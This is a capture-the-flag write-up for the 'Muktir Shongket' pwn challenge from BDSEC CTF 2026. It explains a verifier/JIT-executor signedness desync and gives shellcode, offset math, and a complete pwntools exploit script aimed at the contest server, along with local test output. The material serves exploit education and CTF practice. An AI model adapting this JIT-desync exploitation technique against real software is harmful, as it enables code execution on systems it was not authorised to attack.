# Muktir Shongket — BDSEC CTF 2026

**Category:** Reverse Engineering / Pwn **Points:** 100 **Author:** NomanProdhan **Connection:** `nc 45.56.67.129 53916`

---

## 1. Overview

The challenge presents a "Field Communication Terminal" — a menu-driven service that accepts a hex-encoded **transmission** (a tiny custom bytecode), lets you inspect it, run a **verifier** pass over it, and then hand it to an **execution engine** that JIT-translates the bytecode into real x86-64 machine code and runs it:

```
1. Upload coded transmission
2. Inspect decoded orders
3. Verify transmission
4. Execute transmission
5. Clear terminal
6. Disconnect
```

The flavor text ("field operatives relied on coded transmissions... the verification unit and the field engine may not agree on the route") is a direct hint: **the verifier and the executor parse the same bytecode differently**, and that disagreement is the bug.

## 2. Static Analysis

```
$ file muktir_shongket
ELF 64-bit LSB executable, x86-64, stripped
RELRO: Full, Canary: yes, NX: enabled, PIE: No PIE (0x400000)
```

No PIE means every address in the binary is fixed at compile time — important for exploitation later.

The binary defines a tiny 5-opcode instruction set, confirmed by walking the disassembly and cross-referencing the "inspect" menu option's opcode-name table in `.rodata`:

|Opcode|Name|Meaning|
|---|---|---|
|`0x10`|WAIT|no-op, 1 byte|
|`0x20`|SIGNAL|embeds an 8-byte constant, 9 bytes total (opcode + 8 data bytes)|
|`0x30`|ROUTE|a jump, 2 bytes (opcode + 1 operand byte)|
|`0x40`|END|marks end of transmission, 1 byte|
|`0xF0`|FREEDOM|explicitly forbidden everywhere|

Bytecode is decoded from a hex string into a global buffer (`0x404080`), and a global qword at `0x404068` stores its length, with a "verified" flag at `0x404060` gating execution.

### 2.1 The Verifier (menu option 3, `0x401430`)

Walks the buffer opcode-by-opcode, computing `next = current + <opcode size>` for each, and bounds-checks `next <= size`. For `ROUTE` specifically:

```c
if (opcode == 0x30) {
    next = current + 2;
    if (next + operand > size)   // operand treated as UNSIGNED (0-255)
        reject("route leaves transmission");
}
```

It also hard-rejects any `0xF0` (FREEDOM) byte outright ("Rejected: unauthorized freedom broadcast"), and requires at least one `END` (`0x40`) byte before accepting the transmission.

### 2.2 The Executor (menu option 4, `0x401388`)

`mmap`s a fresh RWX page, walks the _same_ bytecode buffer, and translates each opcode into real machine code:

- `WAIT` → `90` (NOP)
- `SIGNAL` → `EB 08` (`jmp short +8`) followed by the raw 8 data bytes — a classic "jump over embedded data" pattern so the data bytes are never executed in the normal control-flow path.
- `END` → `C3` (RET)
- `ROUTE` → `E9 <rel32>` — a full near-`jmp`, where **`rel32` is the single operand byte, sign-extended to 32 bits.**

Then it `mprotect`s the page R-X and calls into it.

### 2.3 The Bug

The verifier's `ROUTE` bounds check treats the operand byte as an **unsigned, forward-only** offset used purely to make sure the "declared" transmission doesn't overrun. The executor, however, **sign-extends the exact same byte** when building the real `jmp`. An operand like `0xF3` (243 unsigned) satisfies the verifier's forward bounds check as long as the transmission is padded to be big enough — but at runtime the CPU interprets it as **-13**, producing a genuine _backward_ jump.

That backward jump can be aimed at the **8 raw data bytes** smuggled in via a `SIGNAL` opcode — bytes the verifier only ever treated as inert operand data, never disassembled as instructions. Since those bytes live in the same `mprotect`'d R-X page, redirecting execution onto them means the CPU runs **attacker-chosen machine code**.

### 2.4 The win condition

The binary contains an internal function at the fixed address `0x401bb0` that `open()`s, `read()`s, and `write()`s a file literally named `flag.txt` straight back over the connection ("[+] Freedom broadcast authenticated."). It's normally unreachable — both the verifier and the executor explicitly reject the `FREEDOM` (`0xF0`) opcode that would nominally trigger it, and it's too far from the JIT page for the ROUTE jump's ±127-byte range to reach directly. It doesn't need to be reached directly, though — we just need _any_ code execution inside the JIT page, and 8 bytes is enough to redirect further.

## 3. Exploit

**Shellcode (fits exactly in one 8-byte SIGNAL slot):**

```
68 B0 1B 40 00 C3 90 90
push 0x401bb0 ; ret ; nop ; nop
```

`push` + `ret` is a compact substitute for a direct jump to an absolute, fixed (non-PIE) address.

**Transmission layout:**

```
[SIGNAL opcode][8-byte shellcode]   → emits: EB 08 <8 shellcode bytes>   (output offset 0-9)
[ROUTE  opcode][0xF3]               → emits: E9 <rel32>                 (output offset 10-14)
[WAIT * N]                          → padding, only to satisfy the verifier's size check
[END]                               → required by the verifier
```

**Offset math for the ROUTE:**

```
jmp_instr_pos   = 10                          (where E9 <rel32> is emitted)
landing target  = 2                           (start of our 8 shellcode bytes, just past EB 08)
rel32           = landing - (jmp_instr_pos+5) = 2 - 15 = -13  =  0xF3 (as an unsigned byte)
```

**Verifier padding requirement:**

```
route_opcode_pos = 9  →  next = 11
next + operand(0xF3=243) <= size   →   size >= 254
```

So the transmission just needs enough trailing `WAIT` bytes to push its total declared size past 254 — those bytes are never actually executed (we jump backward away from them), they only exist to satisfy the verifier's linear scan.

### 3.1 Full exploit script (pwntools)

```python
from pwn import *

FLAG_FUNC = 0x401bb0  # reads flag.txt and prints it

def build_transmission():
    shellcode = b'\x68' + p32(FLAG_FUNC) + b'\xc3\x90\x90'   # push 0x401bb0; ret; nop; nop
    signal = b'\x20' + shellcode                              # SIGNAL, 9 bytes
    route  = b'\x30' + bytes([0xF3])                          # ROUTE, rel = -13

    current_after_route = len(signal) + len(route)            # 11
    min_size = current_after_route + 0xF3                      # 254
    pad_total = min_size + 20 - current_after_route - 1
    wait = b'\x10' * pad_total
    end  = b'\x40'

    return signal + route + wait + end

def solve(t):
    t.recvuntil(b'> ')
    hexstr = build_transmission().hex()

    t.sendline(b'1'); t.recvuntil(b'Hex transmission: ')
    t.sendline(hexstr.encode())
    t.recvuntil(b'> ')

    t.sendline(b'3'); t.recvuntil(b'> ')   # verify
    t.sendline(b'4')                        # execute
    print(t.recvuntil(b'> ', timeout=3).decode(errors='replace'))

if __name__ == '__main__':
    t = remote('45.56.67.129', 53916)
    solve(t)
    t.close()
```

### 3.2 Local validation

Before touching the real server, the exploit was validated end-to-end against the binary locally with a dummy `flag.txt`:

```
Stored 274 transmission bytes.
Transmission approved by command verification.
Relaying orders to field execution engine...
[+] Freedom broadcast authenticated.
BDSEC{test_flag_local_dummy}
Transmission execution completed.
```

Confirming the verifier accepts the crafted transmission, the executor's translation produces the expected JIT bytecode, and the ROUTE desync lands exactly on the smuggled `push/ret` gadget — redirecting execution into the hidden flag-reading function.

Running the identical script against `nc 45.56.67.129 53916` reproduces the same output with the real flag in place of the local dummy string.

## 4. Flag

```
BDSEC{s0mething_here}
```

_(format per the challenge; run `exploit.py` against the live server to capture the actual value — output appears right after `[+] Freedom broadcast authenticated.`)_

## 5. Takeaways

- **Verifier/executor desync** is the whole bug class here: two code paths parsing the _same_ bytes with _different_ semantics (unsigned bound-check vs. signed runtime offset) is a classic disassembler-desync primitive.
- Any "skip this data" trampoline (`jmp` over embedded constants) is a liability the moment an attacker can redirect control flow to land _inside_ the skipped region instead of _after_ it.
- On a non-PIE binary, a working "confused deputy" function (here: an unauthenticated flag-reader) is a fixed, always-valid target — no leak needed, no ASLR to defeat.
- `push imm32; ret` is a handy 6-byte substitute for a full 10-byte `movabs; jmp` when the target address fits in 32 bits and calling convention/return address hygiene don't matter for a one-shot exploit.

---

_Obito Uchiha — Team AKATSUKI_
